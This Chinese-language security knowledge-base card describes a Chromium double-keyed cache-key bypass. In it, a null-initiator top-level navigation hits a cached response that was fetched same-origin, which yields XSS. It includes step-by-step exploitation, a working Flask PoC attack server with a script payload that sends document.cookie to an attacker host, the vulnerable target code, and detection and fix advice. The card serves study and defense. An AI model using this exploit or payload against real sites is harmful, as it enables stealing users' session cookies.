---
id: web-generic-cache-poisoning-chromium-cn-cache-key-xss
title: Chromium 缓存键 cn_ 绕过实现顶层文档 XSS
type: scenario
domain: web
path: web/generic/cache-poisoning
technique: chromium-cache-key-cn-prefix-bypass
tags:
- xss
- cache
- browser
- chromium
- cache-key
- sandbox-bypass
- sec-fetch-site
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:53+08:00'
  notes: 已对照原文核对（无图片）；未复跑 PoC；卡内关联链接 web-generic-xss 不存在，属小瑕疵
url: /docs/web/generic/cache-poisoning/web-generic-cache-poisoning-chromium-cn-cache-key-xss/
draft: false
kb_aliases:
- Cache XSS
- 缓存 XSS
- cn_ 缓存槽
- 浏览器双键缓存绕过
- sandbox iframe 缓存逃逸
---

## 一句话结论

当目标页把攻击者可控 HTML 通过同源 `fetch` 取回并只放进 `sandbox=""` iframe 时，可先让该响应落入 Chromium 双键 HTTP 缓存的默认槽，再构造一次 initiator 为 null 的顶层主框架导航命中同一缓存槽，使浏览器不联网、不经过服务端校验就把缓存 HTML 当作顶层文档渲染，脚本得以执行形成 XSS。

## 原理

- Chromium 的分区 HTTP 缓存键由 `_dk_`、可选 `s_`、可选 `cn_`、NetworkIsolationKey、URL 等拼接。`s_` 表示“子框架文档资源”，`cn_` 表示“跨站发起的主框架导航”。
- `cn_` 的判定是三个条件同时成立：
  ```cpp
  is_mainframe_navigation && initiator.has_value() &&
  !net::SchemefulSite::IsSameSite(*initiator, url::Origin::Create(url))
  ```
  因此只要 initiator 为空，或 initiator 与目标同站，主框架导航仍落在默认槽。
- 页面自身的同源 `fetch("/render?...")` 是子资源请求，`is_mainframe_navigation` 为 false，响应会写进默认槽；即便之后该响应被转成 blob、塞进 sandbox iframe 或被丢弃，HTTP 层已经完成缓存，和后续 JS 无关。
- 关键分歧在“导航由谁发起”：
  - 地址栏、`page.goto`、302 重定向：initiator 为 null，`Sec-Fetch-Site: none`；
  - 攻击者页执行 `location = victim` 或跨源 fetch：initiator 为攻击者站点，`Sec-Fetch-Site: cross-site`；
  - 跨站 302 属于同一次导航改道，initiator 保持不变；`location=` 则是另起一次新导航，发起者被替换。
- 所以用 302 而不是 `location=` 把 bot 送到目标 URL，就能保留 null initiator，从而不生成 `cn_` 前缀，命中第 3 步写入的默认槽。浏览器直接从缓存返回响应，根本不会向服务端发出第二次 `/render` 请求，服务端的 `X-From-Script` 头校验没有被调用。
- 缓存命中只决定“字节从哪里来”；是否执行脚本由 `Content-Type` 和渲染上下文决定。同一份字节以 `text/html` 作为顶层文档会执行脚本，以 `text/plain` 则只显示文本。

## 触发条件

- 目标站点存在一个“返回用户可控 HTML”的端点，且该端点通过自定义请求头（如 `X-From-Script`）或类似门槛阻止直接导航访问；正常页面用同源 `fetch` 携带该头取回 HTML，并放入 `sandbox=""` 的 iframe。
- bot/受害者使用启用了分区缓存（double-keyed cache）的 Chromium，且缓存键包含 `cn_` 维度。
- 攻击者能控制 bot 访问的外部页面，并能控制该页面的响应头与重定向。
- 攻击者页面必须设置 `Cache-Control: no-store`，否则 `history.back()` 会从 bfcache 恢复页面而不发请求，302 无法送达。
- 目标响应可被缓存（未设置 `no-store`/`private`，或缓存策略允许）。

## 利用步骤

1. bot 通过 `page.goto` 打开攻击者页面；这是浏览器发起的导航，initiator 为 null，该历史记录被保留。
2. 攻击者页面用 `open()` 打开靶机首页 `/?html=<payload>`，让靶机首页加载并执行其自带脚本。此步是跨站导航，但只作为后续缓存的铺垫。
3. 靶机首页脚本用同源 `fetch("/render?html=<payload>")` 携带 `X-From-Script: 1`，拿到 200 与 HTML；这是子资源请求，响应写入默认缓存槽，不带 `cn_`。
4. 攻击者页面执行 `location = blobURL`，制造一条不联网的历史记录作为“垫脚石”。
5. blob 页面执行 `history.back()`，回到第 1 条记录，复用该记录中的 null initiator。
6. 攻击者服务器第二次被访问时返回 302 跳转到 `/render?html=<payload>`；同一次导航改道，null initiator 原样保留。
7. 浏览器计算缓存键：主框架导航但 initiator 为空，不追加 `cn_`，命中默认槽，不联网；缓存中的 HTML 作为顶层文档渲染，脚本执行并外带 Cookie。

## PoC

```python
#!/usr/bin/env python3
from flask import Flask, redirect, request
from urllib.parse import quote
import json

def encodeURIComponent(s):
    return quote(s, safe="~()*!'")

app = Flask(__name__)

REMOTE   = "http://victim.localhost:3000"
ENDPOINT = "/render"
SELF     = "http://attacker.localhost:7777"
PAYLOAD  = "<script>fetch('%s/x?c='+encodeURIComponent(document.cookie))</script>" % SELF
PORT     = 7777

@app.after_request
def add_headers(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache"
    return resp

i = 0
@app.get("/")
def index():
    global i
    i = (i + 1) % 2
    if i == 1:
        return r"""
<script>
const sleep = ms => new Promise(res => setTimeout(res, ms))
const remote = %s
const payload = %s
;(async()=>{
    open(new URL('/?html=' + encodeURIComponent(payload), remote))
    await sleep(1000)
    location = URL.createObjectURL(new Blob([`
        <script>setTimeout(()=>history.back(), 1000)<\/script>
    `], { type: "text/html" }))
})()
</script>
""" % (json.dumps(REMOTE), json.dumps(PAYLOAD).replace("</", "<\\/"))
    return redirect("%s%s?html=%s" % (REMOTE, ENDPOINT, encodeURIComponent(PAYLOAD)))

@app.get("/x")
def exfil():
    print("\n[+PWN] cookie = %r\n" % request.args.get("c"), flush=True)
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
```

靶机侧关键逻辑（漏洞形态）：

```python
@app.get("/render")
def render():
    if not request.headers.get("X-From-Script", ""):
        return "Use script", 400
    return make_response(request.args.get("html", ""))  # 未设置 no-store
```

```javascript
// 同源 fetch 把响应写入默认缓存槽
const blob = await fetch("/render" + location.search, {
  headers: { "X-From-Script": "1" },
}).then((r) => r.blob());
const iframe = document.createElement("iframe");
iframe.setAttribute("sandbox", "");        // 脚本被 sandbox 禁止
iframe.src = URL.createObjectURL(blob);
document.body.append(iframe);
```

预期观测：靶机日志里 `/render` 只出现一次（第 3 步的 fetch），第 7 步的顶层导航没有对应请求，但攻击者 `/x` 收到 Cookie。

## 变体与关联

- 变体：把同一份缓存内容以 `text/plain` 存回，顶层导航仍命中缓存，但脚本只显示为文本，说明缓存命中与渲染上下文相互独立；需要可控 `Content-Type` 才能执行。
- 变体：若目标与攻击者同站（same-site），主框架导航同样不加 `cn_`，可省去 null initiator 的构造。
- 变体：initiator 为 null 的其它来源——地址栏输入、右键新标签页、`page.goto`、302/刷新等；跨站 302 能保留 null 是关键。
- 变体：利用 `history.back()` + bfcache 与 `no-store` 的交互控制请求是否真正发出。
- 关联：`web/generic/xss` 目录下的反射/存储 XSS 手法；本卡的核心不是注入点，而是浏览器缓存键导致“同一响应以不同身份被渲染”。
- 关联：服务端缓存投毒（cache poisoning）关注共享缓存键；本卡关注客户端 HTTP 缓存的 `cn_`/`s_` 维度，两者都利用“缓存键不包含安全相关上下文”。

## 检测与防御

- 检测：服务端出现“顶层页面已渲染但对应渲染端点没有请求日志”的不一致；前端上报的 `Sec-Fetch-Site` 与预期不符；同一 URL 响应被跨上下文复用。
- 检测：对返回用户可控 HTML 的端点审计缓存头，发现缺少 `Cache-Control: no-store` 即可疑。
- 修复：所有包含用户输入或身份相关内容的 HTML 响应设置 `Cache-Control: no-store`（必要时 `private`），避免进入共享/分区缓存。
- 修复：不要仅依赖自定义请求头作为访问门槛；头校验应配合不可缓存的响应、CSRF Token、短期签名或服务端会话校验。
- 修复：对 bot 中的敏感页面禁用缓存或使用独立浏览器上下文；渲染用户 HTML 时使用严格 CSP，并避免把不可信 HTML 放到可被顶层导航命中的 URL。
- 加固：sandbox iframe 不应作为唯一防线；对渲染端点做输出净化与内容类型固定（`Content-Type: text/html; charset=utf-8` 配合 CSP），防止缓存响应被当作顶层文档执行。
- 测试：回归用例覆盖“同源 fetch 写入缓存后，用 302 + history.back 的 null initiator 主框架导航命中缓存”的场景，断言渲染端点被再次请求或响应不可缓存。
